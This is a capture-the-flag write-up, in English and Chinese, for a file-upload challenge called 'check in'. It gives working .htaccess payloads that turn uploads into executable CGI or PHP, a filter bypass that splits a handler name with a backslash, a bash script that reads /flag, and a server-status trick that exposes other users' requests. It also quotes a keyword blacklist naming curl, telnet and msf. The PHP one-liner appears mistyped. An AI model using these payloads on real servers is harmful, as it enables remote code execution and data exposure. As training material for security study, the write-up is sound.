## check in
**Examination of this Challenge**  

1.`.htaccess`Utilization of documents
2.The use of CGI in Linux
Some points to pay attention to when doing this Challenge:
- MIME(`content-type`)Field verification
- Suffix blacklist verification(`/ph|ml|js|cg/`)
- Document content verification
```
/perl|pyth|ph|auto|curl|base|>|rm|ryby|openssl|war|lua|msf|xter|telnet/
```
**Expected solution**  

.htaccess:
```
AddHandler cgi-script .xx
```
1.xx:
```bash
#! /bin/bash

echo Content-type: text/html

echo ""

cat /flag
```
After uploading the file, we found that the status code was 500 and we could not parse the bash file, because our target site was a Linux environment. If we wrote it with the local (windows or other)editor and the encoding format was not consistent with that when uploading, we could not parse it, so we could write it in the Linux environment, export and upload it.

**Unexpected solution 1**  

.htaccess:
```
AddType application/x-httpd-p\
hp .xx
```
1.xx
```php
<?='cat /flag';
```
**Unexpected solution 2**  

Leverage server status information

.htaccess:
```
SetHandler server-status
```
Upload files and access your own upload directory,You can see the server status information,This method can at any time look at the information of a file that someone else has access to, and use someone else's file to successfully getflag.


## check in
**本题考查点**：  

1.`.htaccess`文件的利用
2.linux环境下CGI的利用
文件上传时注意的几点:
- MIME(content-type字段)校验
- 后缀名黑名单校验(`/ph|ml|js|cg/`)
- 文件内容校验
```
/perl|pyth|ph|auto|curl|base|>|rm|ryby|openssl|war|lua|msf|xter|telnet/
```
**预期解**  

.htaccess:
```
Options +ExecCGI
AddHandler cgi-script .xx
```
1.xx:
```bash
#! /bin/bash

echo Content-type: text/html

echo ""

cat /flag
```
注：这里讲下一个小坑，linux中cgi比较严格(2333333)
上传后发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。

**非预期解 1**  

惨痛的教训 ！！！
出题时坑有点多，所以忘记了[2019xnuca中的ezphp](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp),所以许多师傅就利用`\`绕过了waf! (wtclll!!)
.htaccess:
```
AddType application/x-httpd-p\
hp .xx
```
1.xx
```php
<?='cat /flag';
```
**非预期解 2**  

利用apache的服务器状态信息(默认关闭)
.htaccess:
```
SetHandler server-status
```
上传文件后，访问自己的目录就发现是apache的服务器状态信息，可以看到其他人的访问本网站的记录，可以利用次方法，可以白嫖flag。